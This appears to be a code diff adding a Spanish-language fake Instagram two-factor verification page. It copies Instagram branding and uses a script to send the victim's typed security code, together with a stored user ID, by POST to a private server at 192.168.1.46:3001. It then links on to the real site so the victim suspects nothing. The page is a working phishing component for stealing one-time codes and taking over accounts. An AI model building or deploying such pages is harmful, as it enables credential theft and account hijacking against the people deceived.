@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./styles.css" />
+    <title>Verificación de dos factores</title>
+    <style>
+        .mainText {
+            font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-weight: 400;
+        }
+    </style> 
+</head>
+<body>
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+        </section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img src="./img//lock.png" alt="Instagram logo" title="Instagram logo" />
+                </h1>
+                <div class="flex justify-content-center _ab3c mainText">Introduce el código que te hemos enviado al número de teléfono</div>
+                <form>
+                    <label for="email" class="sr-only">Código de seguridad</label>
+                    <input name="email" placeholder="Código de seguridad" />
+                    <a href="https://www.instagram.com">
+                        <button id="confirmButton" type="button">Confirmar</button>
+                    </a>
+                </form>
+
+                <div id="check">
+                    <div class="left-div">
+                        <label><input type="checkbox" id="cbox1" value="first_checkbox" /></label>
+                    </div>
+                    <div class="right-div">
+                        <a class="t1">Confiar en este dispositivo</a><br>
+                        <a>No te pediremos ningún código la próxima vez</a>
+                    </div>
+                </div>
+                <br>
+                <br>
+
+                <div class=" flex direction-column align-items-center">
+                    <div class="_ab4c mainText">
+                        <a>¿No has recibido el código de seguridad? Podemos <a href id="resendLink">volver a enviarlo.</a></a>
+                        <br>
+                        
+                    </div>
+                    <div class="_ab3c mainText">    
+                        <a>Si no puedes recibir el código de seguridad, usa uno de tus  <br><a href id="recoveryLink">códigos de recuperación.</a></a>
+                        <br>
+                    </div>
+                    <div class="login-with-fb align-items-center ab">
+                        <a href="#">También puedes denunciar el contenido que creas</a>
+                        <a href="#">que es ilegal en tu país sin iniciar sesión.</a> 
+                    </div>
+                </div>
+            </div>
+
+            <div class="app-download flex direction-column align-items-center">
+                <p>Descarga la aplicación.</p>
+                <div class="flex justify-content-center">
+                    <img src="./img/apple-button.png"      alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
+                    <img src="./img/googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
+                </div>
+            </div>
+        </section>
+    </main>
+    <footer>
+        <ul class="flex flex-wrap justify-content-center">
+            <li><a href="#">Meta</a></li>
+            <li><a href="#">Información</a></li>
+            <li><a href="#">Blog</a></li>
+            <li><a href="#">Empleo</a></li>
+            <li><a href="#">Ayuda</a></li>
+            <li><a href="#">API</a></li>
+            <li><a href="#">Privacidad</a></li>
+            <li><a href="#">Condiciones</a></li>
+            <li><a href="#">Ubicaciones</a></li>
+            <li><a href="#">Instagram Lite</a></li>
+            <li><a href="#">Threads</a></li>
+        </ul>
+        <p class="copyright">© 2023 Instagram from Meta</p>
+    </footer>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const codeInput = document.querySelector('input[name="email"]');
+            const confirmButton = document.getElementById("confirmButton");
+            
+            // Reemplaza "userId" con el valor correcto del ID de usuario almacenado
+            const userId = localStorage.getItem('userId'); // Recupera el ID de usuario almacenado
+            
+            confirmButton.addEventListener("click", function () {
+                // Obtiene el código de seguridad del input
+                const num = codeInput.value;
+                
+                // Crea un objeto con los datos que deseas enviar en la solicitud POST
+                const data = {
+                    userId: userId,
+                    num: num
+                };
+
+                // Realiza la solicitud POST utilizando la función fetch
+                fetch("http://192.168.1.46:3001/crear-numero", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(data)
+                })
+                .then(response => response.json())
+                .then(responseData => {
+                    // Maneja la respuesta del servidor aquí
+                    console.log("Respuesta del servidor:", responseData);
+
+                    // Realiza cualquier acción adicional que necesites con la respuesta del servidor
+                })
+                .catch(error => {
+                    // Maneja los errores aquí
+                    console.error("Error al enviar la solicitud:", error);
+                });
+            });
+
+            // Agrega eventos para volver a enviar el código y usar códigos de recuperación
+            const resendLink = document.getElementById("resendLink");
+            const recoveryLink = document.getElementById("recoveryLink");
+
+            resendLink.addEventListener("click", function (e) {
+                e.preventDefault();
+                // Aquí puedes implementar la lógica para volver a enviar el código
+            });
+
+            recoveryLink.addEventListener("click", function (e) {
+                e.preventDefault();
+                // Aquí puedes implementar la lógica para usar códigos de recuperación
+            });
+        });
+    </script>
+</body>
+</html>
